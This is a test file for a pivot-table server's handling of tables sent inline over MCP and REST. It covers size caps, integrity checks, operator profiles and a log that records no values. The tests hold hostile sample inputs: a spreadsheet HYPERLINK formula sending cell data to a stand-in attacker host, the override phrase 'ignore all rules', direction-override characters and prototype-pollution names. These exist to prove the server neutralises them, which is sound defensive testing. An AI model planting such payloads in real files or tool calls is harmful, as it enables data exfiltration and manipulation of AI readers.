// Data sent in the request (source "inline:"): a small table on MCP under a cap the operator may only
// lower, the same table or a file (multipart) on REST for profiles with data: true and a larger body
// for them alone; rowCount and sha256 against a cut or altered table; no exposure policy over the
// caller's own rows, never kept, never linked or scheduled; what the log, list_sources, the OpenAPI
// document and check-config say.
import { test } from "node:test";
import assert from "node:assert/strict";
import { createHash } from "node:crypto";
import { readFileSync } from "node:fs";
import { join } from "node:path";
import { unzipSync, strFromU8 } from "fflate";
import { ConfigError, callerOf, checkConfig, createContext, present, presentedInput, validateOptions } from "pivotkit-server";
import { openApiDocument } from "pivotkit-server/rest";
import { BODY_BYTES, MAX_BODY_BYTES } from "../src/listen.js";
import { MCP_DATA_CAP, REST_DATA_BYTES } from "../src/sources/inline.js";
import { OTHER_TOKEN, TOKEN, call, raw, restServer, workspace } from "./helpers.js";

const LOCAL = callerOf("none", undefined);
const BY_REGION = { rows: ["Region"], values: [{ field: "Sales", agg: "sum" }] };

/** A team's open tickets as a model would send them: names, numbers, a blank. */
const TICKETS = Object.freeze({
    name: "Open tickets",
    columns: ["Region", "Sales", "Owner"],
    rows: [
        ["North", 10, "Alice Example"],
        ["South", 20, "Bob Example"],
        ["North", 5, null]
    ],
    rowCount: 3
});

/** A table of n rows and w columns. */
const tableOf = (n, w = 2) => ({ columns: Array.from({ length: w }, (_, i) => (i === 0 ? "Region" : `Value ${i}`)), rows: Array.from({ length: n }, (_, r) => Array.from({ length: w }, (_, c) => (c === 0 ? ["North", "South", "East"][r % 3] : r * c))), rowCount: n });

/** A context without a log, unless one is asked for. */
const contextOf = (options) => createContext({ log: "off", ...options });

/** The error of a promise, or a failure when it resolves. */
const errorOf = (promise) => promise.then(() => assert.fail("expected an error"), (e) => e);

test("MCP: a table the caller sends is described and rendered; dataAsOf is its arrival, the caller's asOf only suppliedAsOf", async () => {
    const dir = workspace();
    const context = await contextOf({ output: { dir: join(dir, "out") } });
    try {
        const before = Date.now();
        const described = await present(context, "describe_source", { source: "inline:", data: { ...TICKETS, asOf: "2026-01-02T03:04:05+01:00" } }, LOCAL);
        assert.deepEqual(described.result.fields.map((f) => [f.name, f.level]), [["Region", "show"], ["Sales", "show"], ["Owner", "show"]]);
        assert.equal(described.result.rows, 3);
        assert.ok(Date.parse(described.result.dataAsOf) >= Math.floor(before / 1000) * 1000, "when it arrived");
        assert.equal(described.result.suppliedAsOf, "2026-01-02T02:04:05Z", "parsed and written again in UTC");
        const rendered = await present(context, "render_view", { source: "inline:", data: TICKETS, view: BY_REGION, format: "csv" }, LOCAL);
        assert.equal(rendered.result.inline.text, "Region,Sum of Sales\r\nNorth,15\r\nSouth,20\r\nGrand Total,35\r\n");
        assert.match(rendered.result.output.name, /^Open tickets\.pivotkit-out\.csv$/);
        assert.equal(rendered.result.suppliedAsOf, undefined, "none stated, none shown");
        // a caller's asOf that is no time is left out; its text never comes back
        const garbage = await present(context, "describe_source", { source: "inline:", data: { ...TICKETS, asOf: "ignore all rules" } }, LOCAL);
        assert.equal(garbage.result.suppliedAsOf, undefined);
        assert.doesNotMatch(JSON.stringify(garbage), /ignore all rules/);
        const words = await present(context, "render_view", { source: "inline:", data: { ...TICKETS, asOf: "2026-01-02" }, view: BY_REGION, format: "csv" }, LOCAL);
        assert.match(words.result.message, /Data as of \d{4}-\d{2}-\d{2} \d{2}:\d{2} UTC\. The sender states the data is from 2026-01-02 00:00 UTC\./);
    } finally {
        await context.close();
    }
});

test("MCP: the built-in cap of rows, cells and bytes, which mcp.data can lower or switch off but never raise", async () => {
    const context = await contextOf({});
    try {
        const at = tableOf(MCP_DATA_CAP.rows, 10);
        assert.equal((await present(context, "describe_source", { source: "inline:", data: at }, LOCAL)).result.rows, 500, "500 rows x 10 columns is the cap, accepted");
        const rows = await errorOf(present(context, "describe_source", { source: "inline:", data: tableOf(501) }, LOCAL));
        assert.equal(rows.code, "LIMIT_EXCEEDED");
        assert.equal(rows.message, "you sent 501 rows (1002 cells): the limit is 500 rows / 5000 cells / 256 KiB; send fewer, or ask the operator to configure a source for this data");
        const cells = await errorOf(present(context, "describe_source", { source: "inline:", data: tableOf(100, 51) }, LOCAL));
        assert.match(cells.message, /^you sent 100 rows \(5100 cells\): the limit is 500 rows/);
        // under the rows and cells, over the bytes: long texts
        const long = { columns: ["Note"], rows: Array.from({ length: 10 }, () => ["x".repeat(30_000)]), rowCount: 10 };
        const bytes = await errorOf(present(context, "describe_source", { source: "inline:", data: long }, LOCAL));
        assert.equal(bytes.code, "LIMIT_EXCEEDED");
        assert.match(bytes.message, /^you sent 293\.1 KiB: the limit is 500 rows \/ 5000 cells \/ 256 KiB/);
    } finally {
        await context.close();
    }
    const lowered = await contextOf({ mcp: { data: { rows: 2 } } });
    try {
        const error = await errorOf(present(lowered, "describe_source", { source: "inline:", data: TICKETS }, LOCAL));
        assert.match(error.message, /the limit is 2 rows \/ 5000 cells \/ 256 KiB/);
        assert.deepEqual((await present(lowered, "list_sources", {}, LOCAL)).result.data, { rows: 2, cells: 5000, bytes: 262_144 });
    } finally {
        await lowered.close();
    }
    for (const [key, value] of [["rows", 501], ["cells", 5001], ["bytes", 262_145]]) {
        assert.throws(() => validateOptions({ mcp: { data: { [key]: value } } }), (e) => e instanceof ConfigError && /can only be lowered/.test(e.message), key);
    }
    assert.throws(() => validateOptions({ mcp: { data: { rows: 0 } } }), /must be 1 or more/);
    assert.throws(() => validateOptions({ mcp: { data: true } }), ConfigError);
    validateOptions({ mcp: { data: { rows: 500, cells: 5000, bytes: 262_144 } } });
});

test("MCP: off with mcp.data false (no data in the schemas) or for a profile that says data: false", async () => {
    const off = await contextOf({ mcp: { data: false } });
    try {
        assert.equal(off.offers.mcp.data, false);
        assert.equal(presentedInput("render_view", { offers: off.offers.mcp }).properties.data, undefined);
        const error = await errorOf(present(off, "describe_source", { source: "inline:", data: TICKETS }, LOCAL));
        assert.equal(error.code, "NOT_ALLOWED");
        assert.match(error.message, /switched it off/);
        assert.equal((await present(off, "list_sources", {}, LOCAL)).result.data, undefined);
    } finally {
        await off.close();
    }
    const profiled = await contextOf({ policy: { profiles: { bot: { data: false } } } });
    try {
        const bot = { ...LOCAL, profile: "bot" };
        assert.equal((await errorOf(present(profiled, "describe_source", { source: "inline:", data: TICKETS }, bot))).code, "NOT_ALLOWED");
        assert.equal((await present(profiled, "list_sources", {}, bot)).result.data, undefined);
        assert.equal((await present(profiled, "describe_source", { source: "inline:", data: TICKETS }, LOCAL)).result.rows, 3, "a caller without that profile still may");
        assert.ok(presentedInput("validate_view", { offers: profiled.offers.mcp }).properties.data);
        assert.equal(presentedInput("get_view_guide", { offers: profiled.offers.mcp }).properties.data, undefined, "only operations that take a source");
    } finally {
        await profiled.close();
    }
});

test("rowCount and the table's shape: a cut table, ragged rows and repeated or hostile names are refused by place, never by value", async () => {
    const context = await contextOf({});
    const refused = async (data, code, pattern) => {
        const error = await errorOf(present(context, "describe_source", { source: "inline:", data }, LOCAL));
        assert.equal(error.code, code, JSON.stringify(data).slice(0, 80));
        assert.match(error.message, pattern);
        assert.doesNotMatch(error.message, /Alice|Bob/, "no value in a message");
    };
    try {
        await refused({ ...TICKETS, rowCount: 200 }, "DATA_MISMATCH", /^you sent 3 rows but rowCount says 200: send the whole table$/);
        await refused({ ...TICKETS, rowCount: undefined }, "INVALID_INPUT", /rowCount/);
        await refused({ ...TICKETS, rows: [["North", 10, "Alice Example"], ["South", 20]] }, "INVALID_INPUT", /^data\.rows\[1\] has 2 values but there are 3 columns/);
        await refused({ ...TICKETS, rows: [["North", 10, "Alice Example", "extra"], ...TICKETS.rows.slice(1)] }, "INVALID_INPUT", /^data\.rows\[0\] has 4 values/);
        await refused({ ...TICKETS, rows: [["North", { a: 1 }, "Alice Example"], ...TICKETS.rows.slice(1)] }, "INVALID_INPUT", /^data\.rows\[0\]\[1\] is a text/);
        await refused({ ...TICKETS, columns: ["Region", "region", "Owner"] }, "INVALID_INPUT", /^data\.columns\[1\] repeats the name of data\.columns\[0\]/);
        await refused({ ...TICKETS, columns: ["Region", "Sales  ", "Sales"] }, "INVALID_INPUT", /repeats the name/);
        await refused({ ...TICKETS, columns: ["Region", "Sa‮les", "Owner"] }, "INVALID_INPUT", /^data\.columns\[1\] holds a control or direction character$/);
        await refused({ ...TICKETS, columns: ["Region", "Sa\nles", "Owner"] }, "INVALID_INPUT", /control or direction/);
        await refused({ ...TICKETS, columns: ["Region", "  ", "Owner"] }, "INVALID_INPUT", /^data\.columns\[1\] is a name/);
        // data goes with inline: only, and inline: only with data; inline: takes no params
        assert.match((await errorOf(present(context, "describe_source", { source: "sales", data: TICKETS }, LOCAL))).message, /^data goes with source "inline:"/);
        assert.match((await errorOf(present(context, "describe_source", { source: "inline:" }, LOCAL))).message, /give data with columns, rows and rowCount/);
        assert.match((await errorOf(present(context, "describe_source", { source: "inline:", data: TICKETS, params: { a: "1" } }, LOCAL))).message, /takes no params/);
        // names that are keys of every object are plain names: rows are lists, never objects keyed by them
        const proto = { columns: ["__proto__", "constructor", "Sales"], rows: [["a", "b", 1], ["c", "d", 2]], rowCount: 2 };
        const described = await present(context, "describe_source", { source: "inline:", data: proto }, LOCAL);
        assert.deepEqual(described.result.fields.map((f) => f.name), ["__proto__", "constructor", "Sales"]);
        const rendered = await present(context, "render_view", { source: "inline:", data: proto, view: { rows: ["__proto__"], cols: ["constructor"], values: [{ field: "Sales", agg: "sum" }] }, format: "csv" }, LOCAL);
        assert.equal(rendered.result.inline.text, "constructor,b,d,Grand Total\r\n__proto__,Sum of Sales,,\r\na,1,,1\r\nc,,2,2\r\nGrand Total,1,2,3\r\n");
        assert.equal({}.polluted, undefined);
    } finally {
        await context.close();
    }
});

test("no exposure policy over the caller's own rows: the server's hidden fields and a profile's summary do not apply; its inline limits do", async () => {
    const options = { policy: { default: "summary", fields: { Owner: "hide", Sales: "hide" }, profiles: { tight: { default: "summary", inline: { cells: 4, bytes: 1000 } } } }, sources: { sales: { load: async () => [{ Region: "North", Sales: 1, Owner: "x" }] } } };
    const context = await contextOf(options);
    try {
        const tight = { ...LOCAL, profile: "tight" };
        for (const caller of [LOCAL, tight]) {
            const described = await present(context, "describe_source", { source: "inline:", data: TICKETS, items: 5 }, caller);
            assert.deepEqual(described.result.fields.map((f) => [f.name, f.level]), [["Region", "show"], ["Sales", "show"], ["Owner", "show"]]);
            assert.equal(described.result.hiddenFields, 0);
        }
        // the configured source keeps its policy
        const own = await present(context, "describe_source", { source: "sales" }, LOCAL);
        assert.deepEqual(own.result.fields.map((f) => f.name), ["Region"]);
        // the profile's inline limit holds: 3 rows x 2 columns is over 4 cells (and no output directory)
        const rendered = await errorOf(present(context, "render_view", { source: "inline:", data: TICKETS, view: BY_REGION, format: "csv" }, tight));
        assert.match(rendered.message, /larger than may come back inline \(4 cells, 1000 bytes\)/);
        assert.equal((await present(context, "render_view", { source: "inline:", data: TICKETS, view: BY_REGION, format: "csv" }, LOCAL)).result.inline.format, "csv");
    } finally {
        await context.close();
    }
});

test("never kept: the same call with other rows answers the new rows; no link, no schedule over it", async () => {
    const context = await contextOf({});
    try {
        assert.equal((await present(context, "describe_source", { source: "inline:", data: TICKETS }, LOCAL)).result.rows, 3);
        assert.equal((await present(context, "describe_source", { source: "inline:", data: { ...TICKETS, rows: TICKETS.rows.slice(0, 1), rowCount: 1 } }, LOCAL)).result.rows, 1);
        const link = await errorOf(present(context, "create_link", { source: "inline:", data: TICKETS, view: BY_REGION }, LOCAL));
        assert.equal(link.code, "NO_LINK");
        assert.match(link.message, /^data sent in the request cannot be linked/);
        const schedule = await errorOf(present(context, "draft_schedule", { source: "inline:", data: TICKETS, view: BY_REGION, name: "Weekly", formats: ["csv"], every: { unit: "day", at: "06:00" }, recipients: ["Team"] }, LOCAL));
        assert.equal(schedule.code, "NOT_SCHEDULABLE");
    } finally {
        await context.close();
    }
});

test("formula injection: a cell that would run as a formula is written safe in csv and xlsx", async () => {
    const dir = workspace();
    const context = await contextOf({ output: { dir: join(dir, "out") } });
    const formula = '=HYPERLINK("https://attacker.example/?q="&A1,"Click")';
    const data = { columns: ["Link", "Sales"], rows: [[formula, 1], ["@SUM(1+1)", 2]], rowCount: 2 };
    const view = { rows: ["Link"], values: [{ field: "Sales", agg: "sum" }] };
    try {
        const csv = await present(context, "render_view", { source: "inline:", data, view, format: "csv" }, LOCAL);
        assert.ok(csv.result.inline.text.includes(`"'${formula.replace(/"/g, '""')}"`), csv.result.inline.text);
        assert.ok(csv.result.inline.text.includes("'@SUM(1+1)"));
        const xlsx = await present(context, "render_view", { source: "inline:", data, view, format: "xlsx" }, LOCAL);
        const files = unzipSync(readFileSync(join(dir, "out", xlsx.result.output.name)));
        const sheet = strFromU8(files["xl/worksheets/sheet1.xml"]);
        assert.doesNotMatch(sheet, /<f>/, "no formula in the workbook");
        assert.match(sheet, /t="inlineStr"[^>]*><is><t[^>]*>=HYPERLINK/);
    } finally {
        await context.close();
    }
});

test("config: data only in the server's policy and its profiles; rest.data.maxBytes up to 64 MiB", () => {
    assert.throws(() => validateOptions({ sources: { s: { file: "a.csv", policy: { data: true } } } }), /sources\.s\.policy\.data: whether a caller may send data is set in policy\.data or a profile/);
    assert.throws(() => validateOptions({ files: { policy: { data: true } } }), /files\.policy\.data/);
    assert.throws(() => validateOptions({ rest: { data: { maxBytes: MAX_BODY_BYTES + 1 } } }), /rest\.data\.maxBytes: 1 to 67108864 \(64 MiB\)/);
    assert.throws(() => validateOptions({ rest: { data: { maxBytes: 0 } } }), /rest\.data\.maxBytes/);
    assert.throws(() => validateOptions({ rest: { data: { max: 1 } } }), /rest\.data: unknown key "max" \(known: maxBytes\)/);
    validateOptions({ policy: { data: false, profiles: { etl: { data: true } } }, rest: { data: { maxBytes: MAX_BODY_BYTES } } });
});

test("check-config: who may send data on MCP and REST, and how much; warnings for a server-wide switch", async () => {
    const dir = workspace();
    const lineOf = async (options, runtime = {}) => {
        const result = await checkConfig({ sources: { sales: { file: "data/sales.csv" } }, baseDir: dir, ...options }, { http: true, rest: true, name: "pivotkit-server", ...runtime });
        const lines = result.text.split("\n");
        const at = lines.findIndex((l) => l.startsWith("Data in the request:"));
        return { line: lines[at], next: lines.slice(at + 1).filter((l) => l.startsWith("  warning:")), text: result.text };
    };
    const designed = await lineOf({ policy: { profiles: { etl: { data: true } } }, auth: { mode: "token", tokens: [{ name: "etl", env: "ETL_TOKEN", profile: "etl" }] }, rest: { data: { maxBytes: 20_971_520 } }, mcp: { data: { rows: 200, cells: 2000, bytes: 131_072 } } }, { env: { ETL_TOKEN: "x".repeat(40) } });
    assert.equal(designed.line, "Data in the request: MCP on, up to 200 rows / 2000 cells / 128 KiB (mcp.data); REST for profiles etl, up to 20 MiB (rest.data.maxBytes)");
    assert.match(designed.text, /New in this version[\s\S]*up to 200 rows \/ 2000 cells \/ 128 KiB/);
    assert.equal((await lineOf({})).line, "Data in the request: MCP on, up to 500 rows / 5000 cells / 256 KiB (built-in cap); REST off (no policy or profile has data: true)");
    const off = await lineOf({ mcp: { data: false } });
    assert.equal(off.line, "Data in the request: MCP off (mcp.data: false); REST off (no policy or profile has data: true)");
    assert.doesNotMatch(off.text, /New in this version/);
    const everyone = await lineOf({ policy: { data: true, profiles: { bot: { data: false } } }, auth: { allowUnauthenticated: true } });
    assert.equal(everyone.line, "Data in the request: MCP on, up to 500 rows / 5000 cells / 256 KiB (built-in cap), not for profiles bot; REST for every caller but profiles bot, up to 10 MiB (default)");
    assert.equal(everyone.next.length, 2);
    assert.match(everyone.next[1], /anyone who reaches the server may send data/);
    assert.match((await lineOf({ rest: { data: { maxBytes: 1000 } } })).next[0], /rest\.data\.maxBytes does nothing/);
    assert.equal((await lineOf({}, { rest: false })).line, "Data in the request: MCP on, up to 500 rows / 5000 cells / 256 KiB (built-in cap)", "an MCP server says nothing of REST");
});

/** A REST server where the profile etl (the token TOKEN) may send data and OTHER_TOKEN may not. */
const restOptions = (dir, more = {}) => ({
    sources: { sales: { file: "data/sales.csv", policy: { default: "show" } } },
    output: { dir: "out" },
    policy: { profiles: { etl: { data: true }, plain: { default: "show" } } },
    auth: { mode: "token", tokens: [{ name: "etl", env: "ETL_TOKEN", profile: "etl" }, { name: "plain", env: "PLAIN_TOKEN", profile: "plain" }] },
    baseDir: dir,
    ...more
});
const restEnv = { env: { ETL_TOKEN: TOKEN, PLAIN_TOKEN: OTHER_TOKEN } };

/** A multipart request: the parts as FormData, sent with fetch. */
async function multipart(url, token, parts) {
    const form = new FormData();
    for (const [name, value] of parts) {
        form.append(name, ...(Array.isArray(value) ? value : [value]));
    }
    const response = await fetch(url, { method: "POST", headers: { authorization: `Bearer ${token}` }, body: form });
    const type = response.headers.get("content-type") ?? "";
    return { status: response.status, headers: response.headers, data: type.includes("json") ? await response.json() : new Uint8Array(await response.arrayBuffer()) };
}

test("REST: off unless a profile says data: true; then JSON data works and the log counts rows and columns, never a value", async () => {
    const plain = await restServer(restOptions(workspace(), { policy: undefined, auth: { mode: "token" } }), { env: { PIVOTKIT_TOKEN: TOKEN } });
    try {
        const refused = await call(`${plain.api}/sources/describe`, { token: TOKEN, body: { source: "inline:", data: TICKETS } });
        assert.equal(refused.status, 400, "no data in the schema of a server that offers none");
        assert.match(refused.data.detail, /has no key "data"/);
        const empty = await call(`${plain.api}/sources/describe`, { token: TOKEN, body: { source: "inline:" } });
        assert.equal(empty.status, 403);
        assert.equal(empty.data.code, "NOT_ALLOWED");
        assert.equal((await call(`${plain.api}/sources`, { token: TOKEN })).data.data, undefined);
    } finally {
        await plain.close();
    }
    const server = await restServer(restOptions(workspace()), restEnv);
    try {
        const ok = await call(`${server.api}/views/render`, { token: TOKEN, body: { source: "inline:", data: TICKETS, view: BY_REGION, format: "csv" } });
        assert.equal(ok.status, 200, JSON.stringify(ok.data));
        assert.equal(ok.data.summary.sourceRows, 3);
        const other = await call(`${server.api}/views/render`, { token: OTHER_TOKEN, body: { source: "inline:", data: TICKETS, view: BY_REGION, format: "csv" } });
        assert.equal(other.status, 403);
        assert.match(other.data.detail, /your token may not send data \(the operator allows it per profile: data: true\)/);
        const mismatch = await call(`${server.api}/sources/describe`, { token: TOKEN, body: { source: "inline:", data: { ...TICKETS, rowCount: 4 } } });
        assert.equal(mismatch.status, 422);
        assert.equal(mismatch.data.code, "DATA_MISMATCH");
        const noCount = await call(`${server.api}/sources/describe`, { token: TOKEN, body: { source: "inline:", data: { ...TICKETS, rowCount: undefined } } });
        assert.equal(noCount.status, 400);
        assert.match(noCount.data.detail, /needs rowCount/);
        assert.deepEqual((await call(`${server.api}/sources`, { token: TOKEN })).data.data, { maxBytes: REST_DATA_BYTES });
        assert.equal((await call(`${server.api}/sources`, { token: OTHER_TOKEN })).data.data, undefined);
        // REST has no row cap of its own beyond the body and the import limits
        assert.equal((await call(`${server.api}/sources/describe`, { token: TOKEN, body: { source: "inline:", data: tableOf(2000) } })).data.rows, 2000);
        const lines = server.log.filter((l) => l.event === "request" && l.source === "inline:");
        assert.ok(lines.length >= 3);
        assert.deepEqual([lines[0].rows, lines[0].columns], [3, 3]);
        assert.doesNotMatch(JSON.stringify(server.log), /Alice Example|North/);
    } finally {
        await server.close();
    }
});

test("REST: a larger body only for a signed-in caller that may send data; a larger declared size is refused before the token", async () => {
    const server = await restServer(restOptions(workspace(), { rest: { data: { maxBytes: 4 * 1_048_576 } } }), restEnv);
    // about 3 MiB of JSON: over the 2 MiB everyone gets, under the 4 MiB of etl
    const big = { columns: ["Region", "Note"], rows: Array.from({ length: 30_000 }, (_, i) => [["North", "South"][i % 2], "n".repeat(90)]), rowCount: 30_000 };
    const body = JSON.stringify({ source: "inline:", data: big });
    assert.ok(body.length > BODY_BYTES && body.length < 4 * 1_048_576);
    try {
        const ok = await call(`${server.api}/sources/describe`, { token: TOKEN, body });
        assert.equal(ok.status, 200, JSON.stringify(ok.data).slice(0, 200));
        assert.equal(ok.data.rows, 30_000);
        const other = await call(`${server.api}/sources/describe`, { token: OTHER_TOKEN, body });
        assert.equal(other.status, 413);
        assert.equal(other.data.code, "BODY_TOO_LARGE");
        // a declared size over the largest anyone may send: refused without looking at the token
        const declared = await raw(`${server.api}/sources/describe`, { method: "POST", headers: { "content-type": "application/json", authorization: "Bearer wrong-token-0123456789-0123456789-01234567", "content-length": String(5 * 1_048_576) } });
        assert.equal(declared.status, 413);
        // over etl's own cap, streamed without a declared size
        const over = JSON.stringify({ source: "inline:", data: { ...big, rows: [...big.rows, ...big.rows], rowCount: 60_000 } });
        const stream = new ReadableStream({ start(controller) { controller.enqueue(new TextEncoder().encode(over)); controller.close(); } });
        const tooLarge = await fetch(`${server.api}/sources/describe`, { method: "POST", headers: { "content-type": "application/json", authorization: `Bearer ${TOKEN}` }, body: stream, duplex: "half" }).catch((e) => e);
        // the 413, or a connection cut while the rest was still on its way: never an answer of 200
        assert.ok(tooLarge instanceof Error || tooLarge.status === 413, String(tooLarge.status ?? tooLarge));
    } finally {
        await server.close();
    }
    // a server that offers no data keeps 2 MiB for everyone, also for a valid token
    const plain = await restServer(restOptions(workspace(), { policy: undefined, auth: { mode: "token" } }), { env: { PIVOTKIT_TOKEN: TOKEN } });
    try {
        assert.equal((await call(`${plain.api}/sources/describe`, { token: TOKEN, body })).status, 413);
    } finally {
        await plain.close();
    }
});

test("REST multipart: csv, tsv, json and xlsx files with the input beside them; sha256 checked; the parts and the input's data limited", async () => {
    const server = await restServer(restOptions(workspace()), restEnv);
    const csv = "Region,Sales\nNorth,10\nSouth,20\nNorth,5\n";
    const url = `${server.api}/views/render`;
    const input = (more = {}) => JSON.stringify({ view: BY_REGION, format: "json", ...more });
    try {
        const ok = await multipart(url, TOKEN, [["data", [new Blob([csv]), "sales.csv"]], ["input", input({ data: { name: "Sales export", asOf: "2026-11-01T00:00:00Z", sha256: createHash("sha256").update(csv).digest("hex").toUpperCase() } })]]);
        assert.equal(ok.status, 200, JSON.stringify(ok.data));
        assert.equal(ok.data.summary.sourceRows, 3);
        assert.equal(ok.data.suppliedAsOf, "2026-11-01T00:00:00Z");
        assert.match(ok.data.output.name, /^Sales export\.pivotkit-out\.json$/);
        // the format by the content type when the name has no known extension; tsv and json files
        assert.equal((await multipart(url, TOKEN, [["data", [new Blob(["Region\tSales\nNorth\t1\n"], { type: "text/tab-separated-values" }), "export"]], ["input", input()]])).status, 200);
        assert.equal((await multipart(url, TOKEN, [["data", [new Blob([JSON.stringify([{ Region: "North", Sales: 1 }])]), "rows.json"]], ["input", input()]])).status, 200);
        // a workbook: a report of pivotkit's own (a flat table, sheet "Report"), sent back as data
        const flat = await call(`${server.api}/views/render/file`, { token: TOKEN, body: { source: "inline:", data: TICKETS, view: { rows: ["Region"], values: [{ field: "Sales", agg: "sum" }] }, format: "xlsx" } });
        assert.equal(flat.status, 200);
        const book = await multipart(url, TOKEN, [["data", [new Blob([flat.data]), "book.xlsx"]], ["input", input({ view: { rows: ["Region"], values: [{ field: "Region", agg: "count" }] } })]]);
        assert.equal(book.status, 200, JSON.stringify(book.data));
        const altered = await multipart(url, TOKEN, [["data", [new Blob([csv]), "sales.csv"]], ["input", input({ data: { sha256: createHash("sha256").update(`${csv}x`).digest("hex") } })]]);
        assert.equal(altered.status, 422);
        assert.equal(altered.data.code, "DATA_MISMATCH");
        const cases = [
            [[["data", [new Blob([csv]), "a.csv"]], ["input", input()], ["extra", "x"]], 400, /at most two parts/],
            [[["data", [new Blob([csv]), "a.csv"]], ["data", [new Blob([csv]), "b.csv"]]], 400, /each part once/],
            [[["input", input()]], 400, /needs a part data/],
            [[["data", csv], ["input", input()]], 400, /send it with a file name/],
            [[["data", [new Blob([csv]), "a.exe"]], ["input", input()]], 415, /csv, tsv, json or xlsx/],
            [[["data", [new Blob([csv]), "a.csv"]], ["input", input({ data: { rows: [["x"]] } })]], 400, /has no key "rows"/],
            [[["data", [new Blob([csv]), "a.csv"]], ["input", input({ data: { rowCount: 3 } })]], 400, /has no key "rowCount"/],
            [[["data", [new Blob([csv]), "a.csv"]], ["input", input({ source: "sales" })]], 400, /leave source out or give "inline:"/],
            [[["data", [new Blob([csv]), "a.csv"]], ["input", "{not json"]], 400, /not valid JSON/],
            [[["data", [new Blob(["{not json"]), "a.json"]], ["input", input()]], 422, /cannot be read/]
        ];
        for (const [parts, status, pattern] of cases) {
            const answer = await multipart(url, TOKEN, parts);
            assert.equal(answer.status, status, `${JSON.stringify(parts.map(([n]) => n))}: ${JSON.stringify(answer.data)}`);
            assert.match(answer.data.detail, pattern);
        }
        // a caller that may not send data is refused before its parts are read
        const other = await multipart(url, OTHER_TOKEN, [["data", [new Blob([csv]), "sales.csv"]], ["input", input()]]);
        assert.equal(other.status, 403);
        // sha256 only with a file: in JSON data it is no key
        const json = await call(`${server.api}/sources/describe`, { token: TOKEN, body: { source: "inline:", data: { ...TICKETS, sha256: "0".repeat(64) } } });
        assert.equal(json.status, 400);
        const logged = server.log.find((l) => l.event === "request" && l.format === "csv");
        assert.deepEqual([logged.source, logged.bytes], ["inline:", csv.length]);
    } finally {
        await server.close();
    }
});

test("REST file route: data the caller sends needs data: true only; a configured source still needs results: true", async () => {
    const server = await restServer(restOptions(workspace()), restEnv);
    try {
        const file = await multipart(`${server.api}/views/render/file`, TOKEN, [["data", [new Blob(["Region,Sales\n=HYPERLINK(\"x\"),1\n"]), "a.csv"]], ["input", JSON.stringify({ view: { rows: ["Region"], values: [{ field: "Sales", agg: "sum" }] }, format: "csv" })]]);
        assert.equal(file.status, 200);
        assert.match(file.headers.get("content-disposition"), /attachment; filename="Data sent with the request\.csv"/);
        assert.match(new TextDecoder().decode(file.data), /"'=HYPERLINK\(""x""\)",1/);
        const json = await call(`${server.api}/views/render/file`, { token: TOKEN, body: { source: "inline:", data: TICKETS, view: BY_REGION, format: "csv" } });
        assert.equal(json.status, 200);
        const configured = await call(`${server.api}/views/render/file`, { token: TOKEN, body: { source: "sales", view: BY_REGION, format: "csv" } });
        assert.equal(configured.status, 403, "results: true still decides for the operator's data");
    } finally {
        await server.close();
    }
});

test("OpenAPI: data and a multipart body only where a policy offers data", () => {
    const off = openApiDocument({ offers: { params: false, data: false } });
    assert.equal(off.components.schemas.RenderViewInput.properties.data, undefined);
    assert.equal(off.paths["/api/v1/views/render"].post.requestBody.content["multipart/form-data"], undefined);
    const on = openApiDocument({ offers: { params: false, data: true } });
    assert.deepEqual(on.components.schemas.RenderViewInput.properties.data.required, ["columns", "rows", "rowCount"]);
    const body = on.paths["/api/v1/views/render"].post.requestBody.content["multipart/form-data"];
    assert.deepEqual(Object.keys(body.schema.properties.input.properties.data.properties), ["name", "asOf", "sheet", "sha256"]);
    assert.ok(!body.schema.properties.input.required?.includes("source"));
    assert.equal(on.paths["/api/v1/views/link"].post.requestBody.content["multipart/form-data"] !== undefined, true, "a link refuses inline data at run time, with its own message");
    assert.equal(on.paths["/api/v1/sources"].get.requestBody, undefined);
});
